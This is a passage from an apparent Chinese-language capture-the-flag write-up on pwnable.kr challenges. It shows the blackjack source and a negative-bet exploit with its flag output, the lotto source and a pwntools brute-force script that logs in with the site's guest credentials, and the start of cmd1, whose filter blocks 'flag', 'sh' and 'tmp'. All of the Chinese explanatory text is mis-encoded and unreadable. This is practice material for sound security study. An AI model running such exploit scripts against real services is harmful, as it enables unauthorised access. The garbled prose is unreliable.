punctuation">;</span>         loss <span class="token operator">=</span> loss<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>         cash <span class="token operator">=</span> cash <span class="token operator">-</span> bet<span class="token punctuation">;</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>         dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>         <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">></span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If dealer's total is more than 21, win</span>      <span class="token punctuation">{</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nUnbelievable! You Win!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         won <span class="token operator">=</span> won<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>         cash <span class="token operator">=</span> cash<span class="token operator">+</span>bet<span class="token punctuation">;</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>         dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>         <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>     <span class="token punctuation">}</span>     <span class="token keyword">else</span>     <span class="token punctuation">{</span>         <span class="token function">stay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span><span class="token keyword">void</span> <span class="token function">cash_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Test for if user has cash remaining in purse</span><span class="token punctuation">{</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>cash <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Once user has zero remaining cash, game ends and prompts user to play again</span>     <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You Are Bankrupt. Game Over"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cash <span class="token operator">=</span> <span class="token number">500</span><span class="token punctuation">;</span>        <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span><span class="token keyword">int</span> <span class="token function">betting</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Asks user amount to bet</span><span class="token punctuation">{</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\nEnter Bet: $"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bet<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>bet <span class="token operator">></span> cash<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player tries to bet more money than player has</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou cannot bet more money than you have."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter Bet: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bet<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> bet<span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">return</span> bet<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span><span class="token keyword">void</span> <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// Function for asking player if they want to play again</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> choice1<span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWould You Like To Play Again?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nPlease Enter Y for Yes or N for No\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"\n%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If invalid choice entered</span>    <span class="token punctuation">{</span>                                                                                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Incorrect Choice. Please Enter Y for Yes or N for No.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'y'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If yes, continue.</span>    <span class="token punctuation">{</span>             <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If no, exit program</span>    <span class="token punctuation">{</span>        <span class="token function">fileresults</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nBYE!!!!\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End function</span><span class="token keyword">void</span> <span class="token function">fileresults</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Prints results into Blackjack.txt file in program directory</span><span class="token punctuation">{</span>    FILE <span class="token operator">*</span>fpresults<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//File pointer is fpresults</span>    fpresults <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>RESULTS<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Creates file and writes into it</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>fpresults <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// what to do if file missing from directory</span>    <span class="token punctuation">{</span>               <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nError: File Missing\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>          <span class="token function">fprintf</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">,</span><span class="token string">"\n\t RESULTS"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">fprintf</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">,</span><span class="token string">"\n\t---------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">fprintf</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">,</span><span class="token string">"\nYou Have Won %d Times\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">fprintf</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">,</span><span class="token string">"\nYou Have Lost %d Times\n"</span><span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">fprintf</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">,</span><span class="token string">"\nKeep Playing and Set an All-Time Record!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>      <span class="token function">fclose</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span></code></pre><h3 id="ÂàÜÊûê-11"><a href="#ÂàÜÊûê-11" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>ÈóÆÈ¢ò‰∏ªË¶ÅÂá∫Ëá™bettingÂáΩÊï∞</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">betting</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Asks user amount to bet</span><span class="token punctuation">{</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\nEnter Bet: $"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bet<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>bet <span class="token operator">></span> cash<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player tries to bet more money than player has</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou cannot bet more money than you have."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter Bet: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bet<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> bet<span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">return</span> bet<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span></code></pre><ol><li>ÈÄâÊã©Âú®Á¨¨‰∫åÊ¨°ËæìÂÖ•Êó∂Áõ¥Êé•Ëæì1000000ÔºåÊó†ËÑëËµåÂà∞Ëµ¢</li><li>ÈÄâÊã©Á¨¨‰∏ÄÊ¨°ËæìÂÖ•-1000000ÔºåÊó†ËÑëËµåÂà∞Ëæì</li></ol><p>Âõ†‰∏∫ÊúÄÂêéËÆ°ÁÆóÈáëÈ¢ùÊó∂ÂÄôÔºå‰∏çÊòØ<code>cash = cash + bet;</code>Â∞±ÊòØ<code>cash = cash - bet;</code>ÂàÜÂà´ÂØπÂ∫î‰∏§ÁßçÂà©Áî®</p><h3 id="Ëß£È¢ò-11"><a href="#Ëß£È¢ò-11" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-shell"><code class="language-shell">YaY_I_AM_A_MILLIONARE_LOLCash: $1000500-------|H    ||  2  ||    H|-------Your Total is 2The Dealer Has a Total of 10</code></pre><h2 id="13-lotto"><a href="#13-lotto" class="headerlink" title="13. lotto"></a>13. lotto</h2><h3 id="È¢òÁõÆ-12"><a href="#È¢òÁõÆ-12" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> submit<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Submit your 6 lotto bytes : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> r<span class="token punctuation">;</span>    r <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> submit<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Lotto Start!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//sleep(1);</span>    <span class="token comment" spellcheck="true">// generate lotto numbers</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/urandom"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>fd<span class="token operator">==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"error. tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> lotto<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> lotto<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"error2. tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        lotto<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>lotto<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">45</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 1 ~ 45</span>    <span class="token punctuation">}</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// calculate lotto score</span>    <span class="token keyword">int</span> match <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>lotto<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> submit<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                match<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// win!</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>match <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad luck...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- nLotto Rule -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"nlotto is consisted with 6 random natural numbers less than 46\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"your goal is to match lotto numbers as many as you can\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"if you win lottery for *1st place*, you will get reward\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"for more details, follow the link below\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"mathematical chance to win this game is known to be 1/8145060.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// menu</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> menu<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- Select Menu -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1. Play Lotto\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2. Help\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"3. Exit\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>menu<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>menu<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>                <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>                <span class="token function">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bye\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token punctuation">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"invalid menu\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-12"><a href="#ÂàÜÊûê-12" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>ÂéüÊù•ËøôÈáå‰∏§Â±ÇÂæ™ÁéØÊù•Âà§Êñ≠Êèê‰∫§ÁöÑÂÄºÊòØÂê¶<strong>ÈÉΩ</strong>Âú® lotto ‰∏≠Âá∫Áé∞Ôºå‰ΩÜÊòØÈÄªËæë‰∏äÊòØÊúâÈóÆÈ¢òÁöÑ</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// calculate lotto score</span>    <span class="token keyword">int</span> match <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>lotto<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> submit<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                match<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>ÂÆûÈôÖ‰∏äËøôÊÆµ‰ª£Á†ÅÊòØÊ£ÄÊµãÊèê‰∫§ÁöÑÂÄºÊòØÂê¶Âú® lotto ‰∏≠Âá∫Áé∞ÔºåÂíåÂéüÊù•Êú¨ÊÑèÊúâÂæàÂ§ßÁöÑÂá∫ÂÖ•ÔºåÂõ†‰∏∫Êàë‰ª¨ÂèØ‰ª•ËæìÂÖ• 6 ÂêåÊ†∑ÁöÑÂÄºÔºåÂè™Ë¶Å‰øùËØÅËøô‰∏™ÂÄºÂú® lotto ÈáåÂá∫Áé∞Âç≥ÂèØÂÆåÊàêÁ†¥Ëß£</p><h3 id="Ëß£È¢ò-12"><a href="#Ëß£È¢ò-12" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>conn <span class="token operator">=</span> ssh<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"pwnable.kr"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">2222</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">"lotto"</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">"guest"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> conn<span class="token punctuation">.</span>process<span class="token punctuation">(</span>executable<span class="token operator">=</span><span class="token string">"/home/lotto/lotto"</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Exit"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"1"</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bytes :"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>chr<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bad luck..."</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="14-cmd1"><a href="#14-cmd1" class="headerlink" title="14. cmd1"></a>14. cmd1</h2><h3 id="È¢òÁõÆ-13"><a href="#È¢òÁõÆ-13" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> cmd<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> r<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"sh"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"tmp"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> r<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> envp<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"PATH=/thankyouverymuch"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">filter</span><span 